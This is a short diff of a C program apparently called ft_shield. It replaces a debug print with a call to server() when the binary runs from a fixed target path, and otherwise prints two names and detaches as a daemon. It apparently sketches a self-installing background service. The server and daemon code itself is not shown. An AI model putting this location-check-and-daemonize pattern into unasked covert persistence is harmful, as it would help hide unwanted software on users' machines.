@@ -1,20 +1,5 @@
 #include <ft_shield.h>
 
-// int executed_mode(void)
-// {
-// 	char	exec_path[256];
-// 	ssize_t	len = readlink("/proc/self/exe", exec_path, sizeof(exec_path));
-
-// 	// if (len != -1)
-// 	// {
-// 		if (strcmp(exec_path, TARGET_PATH) == 0)
-// 			return 0;
-// 		else
-// 			return 1;
-// 	// }
-// 	return -1;
-// }
-
 int main(void)
 {
 	ssize_t	len;
@@ -27,8 +12,7 @@ int main(void)
 		return (EXIT_FAILURE);
 	exec_path[len] = '\0';
 	if (strcmp(exec_path, TARGET_PATH) == 0)
-		printf("SERVER\n");
-		// server();
+		server();
 	else {
 		write(1, "rorozco- & rcabezas\n", 20);
 		daemonize();
